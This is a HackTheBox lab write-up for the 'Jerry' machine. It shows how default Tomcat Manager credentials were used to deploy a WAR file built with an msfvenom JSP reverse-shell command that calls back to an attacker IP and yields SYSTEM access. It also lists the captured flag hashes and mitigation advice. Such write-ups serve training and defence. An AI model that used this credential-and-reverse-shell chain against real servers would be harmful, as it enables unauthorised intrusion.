# Jerry - HackTheBox Writeup

**Date:** 2026-03-19
**OS:** Windows Server 2012 R2
**IP Address:** 10.129.7.7
**Difficulty:** Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Jerry**. 

*   **Initial Access:** Gained access by exploiting default credentials on the Apache Tomcat Manager interface (`tomcat:s3cret`). A malicious WAR file containing a JSP reverse shell was uploaded and executed.
*   **Privilege Escalation:** No privilege escalation was necessary as the Tomcat service was running with `nt authority\system` privileges.
*   **Key Learning Points:** 
    * Default credentials on management interfaces are a critical security risk.
    * Services should be run with the least privilege necessary.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 8080 | HTTP | Apache Tomcat 7.0.88 | Tomcat Manager accessible |

**Nmap Command:**
```bash
nmap -sC -sV -oA nmap/initial 10.129.7.7
```

## 2.2. Web Enumeration
**Strategy:** Manual enumeration of Tomcat Manager and common paths.

### Tomcat Manager
The manager application at `/manager/html` was found to be active. Testing common credentials revealed that `tomcat:s3cret` provided full administrative access.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Default Credentials
*   **Vector:** Tomcat Manager Application

## 3.2. Exploitation Path
1. Created a JSP reverse shell payload using `msfvenom`:
   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.67 LPORT=4444 -f war -o shell.war
   ```
2. Uploaded and deployed the `shell.war` file via the Tomcat Manager's deployment feature.
3. Triggered the reverse shell by accessing `http://10.129.7.7:8080/shell/cgjnokrjzx.jsp`.
4. Gained a shell as `nt authority\system`.

**User Flag:**
```bash
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
# 7004dbcef0f854e0fb401875f26ebd00
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Running `whoami` immediately after gaining access showed the highest privileges.
```bash
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

## 4.2. Exploitation Path
Not required.

**Root Flag:**
```bash
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
# 04a8b36e1545a455393d067e772fe90e
```

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| tomcat | s3cret | Default Credentials |
| user.txt | 7004dbcef0f854e0fb401875f26ebd00 | C:\Users\Administrator\Desktop\flags\ |
| root.txt | 04a8b36e1545a455393d067e772fe90e | C:\Users\Administrator\Desktop\flags\ |

---

# 6. Recommendations & Mitigation
1. **Change Default Credentials:** Immediately change default passwords for all administrative interfaces.
2. **Principle of Least Privilege:** Configure the Tomcat service to run under a dedicated low-privilege user account rather than `SYSTEM`.
3. **Restrict Access:** Limit access to the `/manager` application to specific trusted IP addresses.
